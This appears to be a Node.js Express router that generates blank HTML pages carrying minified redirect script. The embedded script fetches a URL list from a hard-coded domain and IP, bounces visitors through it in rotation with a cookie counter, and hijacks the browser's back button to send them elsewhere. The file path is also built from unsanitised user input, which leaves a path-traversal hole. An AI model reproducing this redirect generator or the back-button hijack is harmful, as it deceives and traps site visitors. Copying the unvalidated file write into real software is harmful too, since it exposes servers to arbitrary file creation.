
var express = require('express');
var fs = require('fs');//引入node的文件(夹)读写包
var router = express.Router();
var app = express();
var routeSql = require('../sql/routeSql.js');
var Sequelize = require('sequelize');
var sequelize = require('../sql/sqlConnect.js')
var Ipconfig = require('../Ipconfig/Ipconfig.js')

router.post('/CreateFile',function(req,res){
    if (req.body.LinkName == '') {
        res.send({error:2,result:{msg:'名称不能为空'}})
    } else {
        routeSql.FileLinkName.findOne({where:{LinkName:req.body.LinkName,IsDeleted:false}}).then(function(data){
    		if (data) {
                res.send({error:1,result:{msg:'该名称已被创建，请重新命名'}})
            } else {
                routeSql.FileLinkName.create({LinkName:req.body.LinkName,LinkUrl:Ipconfig.Local.DomainName + '/edit/'+req.body.LinkName+'.html',Desc:req.body.Desc}).then(function(FileLinkData){
                    var HtmlUrl = './www/edit/' + req.body.LinkName + '.html';
                    var Str = '<!DOCTYPE html><html lang="en" xmlns="http://www.w3.org/1999/html"><head><meta charset="gb2312"><title>.</title></head><body></body><script src="./jQuery/jquery-3.1.0.js"></script><script>function Ipconfigs(){return Ipconfig={Local:{LocalIpHost:"47.98.135.197",DomainName:"menu.xiaoniu.link",LocalIpPort:8800}}}function aa(n){window.history.pushState({title:"title",url:"#"},"title","#"),window.addEventListener("popstate",function(o){window.location=n},!1)}function count(o){var n=getCookie("gangdan");if(!n||1e4<=n){n=0,setCookie("gangdan",1,14);var t=n%o.length;window.location=o[t]}else{setCookie("gangdan",n+1,14);t=n%o.length;window.location=o[t]}}function setCookie(o,n,t){var e=new Date;e.setDate(e.getDate()+t),document.cookie=o+"="+n+";expires="+e}function getCookie(o){for(var n=document.cookie.split(";"),t=0;t<n.length;t++){var e=n[t].split("=");if(e[0]==o)return Number(e[1])}return getRandom(1,2)}function removeCookie(o){setCookie(o,1,-1)}function getRandom(o,n){var t=Math.random()*(n-o),e=Math.round(t+o);return e=Math.max(Math.min(e,n),o)}!function(){var o=Ipconfigs().Local,n="http://"+o.DomainName+":"+o.LocalIpPort+"/FileLinkUrlList?LinkName="+window.location.href.substring(window.location.href.lastIndexOf("/")+1,window.location.href.lastIndexOf("."));console.log(n),$.ajax({type:"GET",url:n,dataType:"json",data:{},beforeSend:function(){},success:function(o){var n=[];o.error?alert(o.result.msg):(o.result.LinkData.map(function(o){n.push(o.LinkUrl)}),count(n),aa(o.result.BackLinkData.LinkUrl))},error:function(o){console.log(o)}}),$.get(n,function(o){console.log(o)})}()</script></html>'
                    fs.writeFile(HtmlUrl,Str,function(err, written, string){
                        if (err) {
                            res.send({error:1,result:err});
                        } else {
                            routeSql.AbpLink.create({FileLinkId:FileLinkData.dataValues.Id,LinkUrl:"https://www.baidu.com",Desc:"百度",ShowSort:0}).then(function(){
                                res.send({error:0,result:{msg:'文件创建成功'}});
                            })
                        }
                    })
                })
            }
    	})
    }
})

router.get('/FileUrlList',function(req,res){
    routeSql.FileLinkName.findAll({where:{IsDeleted:false},order:[['Id','ASC']],attributes:['Id','LinkName','LinkUrl','Desc']}).then(function(FileLinkData){
        res.send({error:0,result:FileLinkData});
    });
})

router.get('/DeleteFile',function(req,res){
    routeSql.FileLinkName.findOne({where:{Id:req.query.Id,IsDeleted:false}}).then(function(FileData){
        if (FileData) {
            routeSql.FileLinkName.update({IsDeleted:true},{where:{Id:req.query.Id,IsDeleted:false}}).then(function(){
                routeSql.AbpLink.update({IsDeleted:true},{where:{FileLinkId:req.query.Id,IsDeleted:false}}).then(function(){
                    res.send({error:0,result:{msg:'删除成功'}})
                })
            })
        } else {
            res.send({error:1,result:{msg:'链接文件不存在'}})
        }
    })
})

module.exports = router;



